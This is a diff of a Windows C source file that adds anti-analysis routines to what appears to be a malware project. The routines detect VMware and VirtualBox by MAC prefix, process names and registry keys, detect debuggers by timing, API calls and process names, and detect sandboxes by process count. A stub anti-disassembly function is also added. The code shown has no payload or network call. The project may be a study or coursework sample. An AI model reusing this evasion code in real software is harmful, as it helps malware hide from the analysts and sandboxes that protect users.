@@ -1,30 +1,51 @@
 
 #include "env_detector.h"
+#include "env_utils.h"
 #include <psapi.h>
 
 
 /**
- * This file looks for the prescence of:
- *  - VMs       (starts line X)
- *  - Sandboxes (starts line Y)
- *  - Debuggers (starts line Z)
+ * Anti-VM techniques (9)
+ *   1. Reserved MAC address range for VMware and VirtualBox
+ *   2. Checks running processes for background VM processes
+ *   3. Checks VMware and VBox registry artifacts! 
+ *  
+ * Anti-Debugger techniques (9)
+ *   1. Performs time based detection
+ *      - Seen in commands.c file, processCommands(...) function
+ *   2. Check for debugger using IsDebuggerPresent() command
+ *   3. Use SetLastError to check for debugger
+ *   4. * Enumerate processes for known debuggers
+ * 
+ * Anti-Dissassembly (5)
+ *   1. Inline assembly found in main.c file
+ * 
+ * Sandboxes (7)
+ *   1. Sleep on launch for 15 minutes
+ *   2. Check the number of processes is < 15
  */
 
+// check current window
+
 static RET_CODE detectVM();
-static RET_CODE detectVMWare(char* mac);
-static RET_CODE detectVirtualBox(char* mac);
-static RET_CODE detectSandbox();
+static RET_CODE checkVMArtifacts();
+static RET_CODE checkVMProcesses();
+static RET_CODE checkVMMacs(char* mac);
+
 static RET_CODE detectDebugger();
+static RET_CODE detectDissassembler();
+static RET_CODE detectSandbox();
 
 
 RET_CODE detectAnalysisTools() {
+    // // Sleep for 15 minutes - anti sandbox technique!
+    // Sleep(900000);
+
     // debugger detection method 1
-    LARGE_INTEGER perfCounterStart;
-    LARGE_INTEGER perfCounterEnd;
-    LARGE_INTEGER perfCounterFrequency;
-    QueryPerformanceFrequency(&perfCounterFrequency);
-    QueryPerformanceCounter(&perfCounterStart);
-    
+    LARGE_INTEGER start, end, freq;
+    QueryPerformanceFrequency(&freq);
+    QueryPerformanceCounter(&start);
+
 
     // try detect malware analysis tools
     RET_CODE ret = detectVM();
@@ -32,14 +53,17 @@ RET_CODE detectAnalysisTools() {
     
     ret = detectDebugger();
     if (ret != R_SAFE_RET) { return ret; }
+
+    ret = detectDissassembler();
+    if (ret != R_SAFE_RET) { return ret; }
     
     ret = detectSandbox();
     if (ret != R_SAFE_RET) { return ret; }
 
 
     // compute the time that has elapsed since the last instruction 
-    QueryPerformanceCounter(&perfCounterEnd);
-    LONG elapsedTime = (perfCounterEnd.QuadPart - perfCounterStart.QuadPart) / perfCounterFrequency.QuadPart;
+    QueryPerformanceCounter(&end);
+    LONG elapsedTime = (end.QuadPart - start.QuadPart) / freq.QuadPart;
     if (elapsedTime > 2.5) {   // if it longer than 2.5 seconds then exit
         printf("Debugger detected by performance!\n");
         return R_DETECT;
@@ -52,70 +76,92 @@ RET_CODE detectAnalysisTools() {
 
 
 // --------------------------
-// ---
+// 
 // ---       Anti-VM      ---
-// ---
+// 
 // --------------------------
-// winow enumeration and process enumeration
+
 
 /**
  * 
  */
 static RET_CODE detectVM() {
-    char mac[18];
-    RET_CODE ret = retrieveMAC(mac);    
-    if (ret != R_SUCCESS) { return ret; }
+    if (checkVMArtifacts() == R_DETECT) { return R_DETECT; }
+    if (checkVMProcesses() == R_DETECT) { return R_DETECT; }
 
-    if (detectVMWare(mac) == R_DETECT)     { return R_DETECT; } 
-    if (detectVirtualBox(mac) == R_DETECT) { return R_DETECT; }
+    char mac[18];
+    RET_CODE ret = retrieveMAC(mac);
+    if (ret != R_SUCCESS) { return ret; }
+    if (checkVMMacs(mac) == R_DETECT) { return R_DETECT; }
+
     return R_SAFE_RET;
 }
 
 /**
- * simply checks whether the prefix of the mac addr is "00:0C:29",
- * if it is then we are in a VMware environment!
+ * Simply checks whether the prefix of the mac addr is "00:0C:29" for
+ * VMware environments, and then checks for "0A:00:27" and "08:00:27" 
+ * we are in VBox environments!
  */
-static RET_CODE detectVMWare(char* mac) {
+static RET_CODE checkVMMacs(char* mac) {
+    // VMware mac detection
     if (strncmp(mac, VMWARE_MAC_PREFIX, MAC_PREFIX_LEN) == 0) {
-        printf("VMware detected!\n");
+        printf("VMware A detected!\n");
         return R_DETECT;
     }
-    return R_SAFE_RET;
-}
-
-/**
- * similarly to the pervious function, checks whether the prefix of the mac addr
- * is "0A:00:27" or "08:00:27" we are in vbox this time!
- */
-static RET_CODE detectVirtualBox(char* mac) {
+    // VBox mac detection
     if (strncmp(mac, VBOX_HOST_ONLY_MAC_PREFIX, MAC_PREFIX_LEN) == 0) {
         printf("VBOX A detected!\n");
         return R_DETECT;
-    } else if (strncmp(mac, VBOX_OTHER_MAC_PREFIX, MAC_PREFIX_LEN) == 0) {
+    } 
+    if (strncmp(mac, VBOX_OTHER_MAC_PREFIX, MAC_PREFIX_LEN) == 0) {
         printf("VBOX B detected!\n");
         return R_DETECT;
     }
     return R_SAFE_RET;
 }
 
-
-
-// --------------------------
-// ---
-// ---    Anti-Sandbox    ---
-// ---
-// --------------------------
-
-
-static RET_CODE detectSandbox() {
-    DWORD processes[20];
-    DWORD bytesOut;
-    EnumProcesses(processes, sizeof(processes), &bytesOut);
-    
-    DWORD numPr = bytesOut / sizeof(DWORD);
-    if (numPr < 15) {
-        printf("Sandbox detected by < 15!\n");
+static RET_CODE checkVMProcesses() {
+    // detect vmaware processes running
+    char* vmWareProcesses[3] = { "vmtoolsd", "vmwaretray", "vmwaretool" };
+    BOOL result = enumProcessesForTargets(vmWareProcesses, 3);
+    if (result) {
+        printf("VMware Process detected!\n");
         return R_DETECT;
+    }
+
+    // detect vbox processes running
+    char* vBoxProcesses[2] = { "VBoxService", "VBoxTray" };
+    result = enumProcessesForTargets(vBoxProcesses, 2);
+    if (result) {
+        printf("VBOX Process detected!\n");
+        return R_DETECT;
+    }
+    return R_SAFE_RET;
+}
+
+/**
+ * Loop through a range of registry keys that can be found in VMware 
+ * and VBox VMs. If one is found then return with the detecion flag!
+ */
+static RET_CODE checkVMArtifacts() {
+    char* regKeys[5] = {
+        // VMware registry artifacts
+        "SOFTWARE\\VMware, Inc.",
+        "SYSTEM\\CurrentControlSet\\Services\\vmtools",
+        // VBox registry artifacts
+        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
+        "SYSTEM\\CurrentControlSet\\Services\\VBoxService",
+        "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo"
+    };
+
+    // check each key exists
+    for (int i = 0; i < 5; i++) {
+        HKEY hKey;
+        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, regKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            printf("DETECTED: %s\n", regKeys[i]);
+            RegCloseKey(hKey);
+            return R_DETECT;
+        }
     }
     return R_SAFE_RET;
 }
@@ -123,9 +169,9 @@ static RET_CODE detectSandbox() {
 
 
 // ---------------------------
-// ---
+// 
 // ---   Anti-Debugging   ----
-// ---
+// 
 // ---------------------------
 
 
@@ -146,6 +192,50 @@ static RET_CODE detectDebugger() {
         return R_DETECT;
     }
 
+    // anti-debugger method 4:
+    char* dbgProcesses[2] = { "OLLYDBG", "Dbg" };
+    res = enumProcessesForTargets(dbgProcesses, 2);
+    if (res) {
+        printf("Debugger Process detected!\n");
+        return R_DETECT;
+    }
 
     return R_SAFE_RET;
 }
+
+
+
+// -----------------------------
+// 
+// ---   Anti-Dissassembly   ---
+// 
+// -----------------------------
+
+
+static RET_CODE detectDissassembler() {
+
+    return R_SAFE_RET;
+}
+
+
+
+// --------------------------
+// 
+// ---    Anti-Sandbox    ---
+// 
+// --------------------------
+
+
+static RET_CODE detectSandbox() {
+    DWORD processes[20];
+    DWORD bytesOut;
+    EnumProcesses(processes, sizeof(processes), &bytesOut);
+    
+    DWORD numPr = bytesOut / sizeof(DWORD);
+    if (numPr < 15) {
+        printf("Sandbox detected by < 15!\n");
+        return R_DETECT;
+    }
+    return R_SAFE_RET;
+}
+
